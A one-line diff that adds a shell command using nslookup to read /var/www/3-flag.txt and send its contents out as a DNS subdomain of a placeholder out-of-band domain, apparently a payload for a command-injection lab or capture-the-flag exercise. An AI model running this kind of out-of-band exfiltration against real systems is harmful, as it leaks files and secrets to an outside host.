@@ -1,0 +1,1 @@
+nslookup $(cat /var/www/3-flag.txt 2>/dev/null | tr -d '\n').YOUR-OAST-DOMAIN
